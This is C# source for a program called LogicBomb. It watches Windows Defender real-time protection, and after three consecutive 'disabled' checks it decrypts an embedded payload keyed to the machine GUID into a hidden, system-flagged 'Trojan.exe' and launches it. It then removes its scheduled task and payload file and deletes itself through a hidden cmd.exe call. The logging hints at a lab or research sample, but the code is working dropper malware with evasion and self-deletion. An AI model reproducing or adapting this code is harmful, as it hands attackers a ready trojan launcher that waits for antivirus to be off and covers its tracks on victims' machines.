using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading;
using System.Threading.Tasks;
using SharedCrypto;

namespace LogicBomb
{
    internal class Program
    {
        private static readonly string ExecutableBaseDir = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string ResultDir = Path.Combine(ExecutableBaseDir, "result");

        private const string MarkerName = "activated.txt";
        private const string EncryptedBombName = "bomb.encrypted";
        private const string DecryptedTrojanName = "Trojan.exe";
        private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";

        private const int CheckIntervalSeconds = 10;
        private const int ConsecutiveChecksRequired = 3;

        private static string logFile;
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static int consecutiveDownChecks = 0;
        private static bool lastRealtimeProtectionStatus = true;

        static void Main(string[] args)
        {
            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
            Directory.CreateDirectory(ResultDir);
            logFile = Path.Combine(ResultDir, "logicbomb_log.jsonl");

            LogEvent("startup", ExecutableBaseDir, "process_started",
                $"PID:{Process.GetCurrentProcess().Id},User:{Environment.UserName}");

            Console.CancelKeyPress += (s, e) =>
            {
                Console.WriteLine("[LogicBomb] Stopping...");
                e.Cancel = true;
                cts.Cancel();
            };

            Console.WriteLine($"[LogicBomb] Monitoring Windows Defender Real-Time Protection");
            Console.WriteLine($"[LogicBomb] Check interval: {CheckIntervalSeconds} seconds");
            Console.WriteLine($"[LogicBomb] Trigger after {ConsecutiveChecksRequired} consecutive 'disabled' checks");
            Console.WriteLine();

            try
            {
                MonitorDefenderLoop(cts.Token).Wait();
            }
            finally
            {
                cts?.Dispose();
            }

            Console.WriteLine("[LogicBomb] Exiting.");
        }

        private static async Task MonitorDefenderLoop(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
                    bool realtimeProtectionEnabled = IsRealtimeProtectionEnabled();

                    if (realtimeProtectionEnabled != lastRealtimeProtectionStatus)
                    {
                        if (realtimeProtectionEnabled)
                        {
                            LogWarning("Windows Defender Real-Time Protection is now ENABLED");
                            LogEvent("realtime_protection", "RTP", "status_change", "enabled");
                            consecutiveDownChecks = 0;
                        }
                        else
                        {
                            LogWarning("Windows Defender Real-Time Protection is now DISABLED");
                            LogEvent("realtime_protection", "RTP", "status_change", "disabled");
                        }
                        lastRealtimeProtectionStatus = realtimeProtectionEnabled;
                    }

                    if (!realtimeProtectionEnabled)
                    {
                        consecutiveDownChecks++;
                        Console.WriteLine($"[LogicBomb] Real-Time Protection disabled - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");

                        if (consecutiveDownChecks >= ConsecutiveChecksRequired)
                        {
                            LogWarning($"Real-Time Protection has been disabled for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
                            LogEvent("trigger", "RTP", "trigger_activated", $"rtp_disabled_{ConsecutiveChecksRequired}_checks");

                            TriggerPayload();
                            break;
                        }
                    }
                    else
                    {
                        if (consecutiveDownChecks > 0)
                        {
                            consecutiveDownChecks = 0;
                        }
                    }

                    await Task.Delay(CheckIntervalSeconds * 1000, token);
                }
            }
            catch (TaskCanceledException)
            {
                Console.WriteLine("[LogicBomb] Monitoring cancelled.");
            }
            catch (Exception ex)
            {
                LogError($"Monitor loop error: {ex.Message}");
                LogEvent("error", "monitor_loop", "exception", ex.Message);
            }
        }

        private static bool IsRealtimeProtectionEnabled()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
                {
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
                        if (rtpEnabled != null)
                        {
                            bool enabled = Convert.ToBoolean(rtpEnabled);
                            return enabled;
                        }
                    }
                }
            }
            catch (ManagementException mex)
            {
                LogWarning($"WMI query failed: {mex.Message}");

                try
                {
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
                    {
                        if (key != null)
                        {
                            object disableValue = key.GetValue("DisableRealtimeMonitoring");
                            if (disableValue != null)
                            {
                                int disabled = Convert.ToInt32(disableValue);
                                return disabled == 0;
                            }
                        }
                    }
                }
                catch (Exception regEx)
                {
                    LogWarning($"Registry check failed: {regEx.Message}");
                }
            }
            catch (Exception ex)
            {
                LogError($"Failed to check Real-Time Protection: {ex.Message}");
                LogEvent("error", "RTP", "check_failed", ex.Message);
            }

            LogWarning("Could not determine RTP status, assuming enabled");
            return true;
        }

        private static void TriggerPayload()
        {
            try
            {
                Console.WriteLine("[LogicBomb] === PAYLOAD TRIGGERED ===");
                LogEvent("trigger_start", ExecutableBaseDir, "payload_activation", null);

                string markerPath = Path.Combine(ResultDir, MarkerName);
                File.WriteAllText(markerPath,
                    $"Activated by Windows Defender Real-Time Protection being disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                Console.WriteLine("[LogicBomb] Created marker: " + markerPath);

                string machineGuid = CryptoUtils.GetMachineGuid();
                LogInfo($"Local Machine GUID: {machineGuid}");

                string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                string executableToRun = null;

                if (File.Exists(encryptedBombPath))
                {
                    try
                    {
                        Console.WriteLine($"[LogicBomb] Found encrypted payload: {encryptedBombPath}");

                        string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);

                        Console.WriteLine($"[LogicBomb] Decrypted payload to: {decryptedTrojanPath}");
                        LogEvent("decrypted", encryptedBombPath, "decrypted_to", decryptedTrojanPath);

                        if (File.Exists(decryptedTrojanPath))
                        {
                            // Set Trojan.exe as Hidden + System
                            try
                            {
                                File.SetAttributes(decryptedTrojanPath, FileAttributes.Hidden | FileAttributes.System);
                                LogSuccess($"Set attributes for {DecryptedTrojanName} to Hidden+System");
                                LogEvent("attributes_set", decryptedTrojanPath, "set_hidden_system", null);
                            }
                            catch (Exception ex)
                            {
                                LogWarning($"Failed to set attributes on Trojan.exe: {ex.Message}");
                            }

                            executableToRun = decryptedTrojanPath;
                            Console.WriteLine($"[LogicBomb] Trojan.exe ready for execution");
                        }
                        else
                        {
                            Console.WriteLine($"[LogicBomb] Trojan.exe not found after decryption");
                            LogEvent("error", decryptedTrojanPath, "decryption_result_missing", null);
                        }
                    }
                    catch (System.Security.Cryptography.CryptographicException ex)
                    {
                        Console.WriteLine("[LogicBomb] Decryption failed: " + ex.Message);
                        LogEvent("error", encryptedBombPath, "decrypt_failed", ex.Message);
                        executableToRun = null;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error processing encrypted payload: " + ex.Message);
                        LogEvent("error", encryptedBombPath, "processing_failed", ex.Message);
                        executableToRun = null;
                    }
                }
                else
                {
                    Console.WriteLine($"[LogicBomb] {EncryptedBombName} not found in program directory.");
                    LogEvent("error", ExecutableBaseDir, "no_encrypted_bomb", null);
                }

                if (executableToRun != null)
                {
                    Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
                    LogEvent("final", executableToRun, "about_to_launch", "payload launching");

                    var psi = new ProcessStartInfo
                    {
                        FileName = executableToRun,
                        WorkingDirectory = ResultDir,
                        UseShellExecute = true,
                        CreateNoWindow = false
                    };

                    try
                    {
                        Process.Start(psi);
                        LogEvent("launched", executableToRun, "launched", null);
                        Console.WriteLine("[LogicBomb] Trojan.exe started.");

                        CleanupAndExit();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[LogicBomb] Error launching executable: " + ex.Message);
                        LogEvent("error", executableToRun, "launch_failed", ex.Message);
                    }
                }
                else
                {
                    LogError("Payload trigger failed - no executable to run");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] TriggerPayload error: " + ex.Message);
                LogEvent("error", "trigger_payload", "exception", ex.Message);
            }
        }

        private static void CleanupAndExit()
        {
            try
            {
                LogEvent("cleanup", "self", "starting_cleanup", "self-destruct initiated");
                Console.WriteLine("[LogicBomb] Starting self-destruct sequence...");

                DeleteScheduledTask(LOGICBOMB_TASK_NAME);

                string bombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                if (File.Exists(bombPath))
                {
                    File.Delete(bombPath);
                    Console.WriteLine("[LogicBomb] Deleted bomb.encrypted");
                    LogEvent("cleanup", bombPath, "deleted", "encrypted payload removed");
                }

                string selfPath = Process.GetCurrentProcess().MainModule.FileName;

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C timeout /T 2 /NOBREAK > nul & del /F /Q \"{selfPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
                Console.WriteLine("[LogicBomb] Self-deletion scheduled");
                LogEvent("cleanup", selfPath, "self_delete_scheduled", "LogicBomb will be deleted in 2 seconds");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LogicBomb] Cleanup error: " + ex.Message);
                LogEvent("error", "cleanup", "failed", ex.Message);
            }

            Console.WriteLine("[LogicBomb] Exiting now. Trojan is running.");
            Environment.Exit(0);
        }

        private static void DeleteScheduledTask(string taskName)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Delete /TN \"{taskName}\" /F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (process.ExitCode == 0)
                    {
                        Console.WriteLine($"[LogicBomb] Deleted scheduled task: {taskName}");
                        LogEvent("cleanup", taskName, "task_deleted", "persistence removed");
                    }
                    else
                    {
                        Console.WriteLine($"[LogicBomb] Failed to delete task: {error}");
                        LogEvent("cleanup", taskName, "task_delete_failed", error);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[LogicBomb] Error deleting task: {ex.Message}");
                LogEvent("error", taskName, "task_delete_exception", ex.Message);
            }
        }

        private static void LogEvent(string type, string path, string ev, string note)
        {
            try
            {
                var obj = new Dictionary<string, string>
                {
                    ["timestamp"] = DateTime.UtcNow.ToString("o"),
                    ["type"] = type ?? "unknown",
                    ["event"] = ev ?? "none",
                    ["path"] = path ?? "null",
                    ["note"] = note ?? "none"
                };
                string json = "{ " + string.Join(", ", obj.Select(kv => $"\"{kv.Key}\": \"{Escape(kv.Value)}\"")) + " }";

                int retries = 3;
                while (retries > 0)
                {
                    try
                    {
                        File.AppendAllText(logFile, json + Environment.NewLine);
                        break;
                    }
                    catch (IOException) when (retries > 1)
                    {
                        retries--;
                        Thread.Sleep(50);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[LogicBomb] Logging failed: {ex.Message}");
            }
        }

        private static string Escape(string s)
        {
            return s?.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n") ?? "";
        }

        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }
}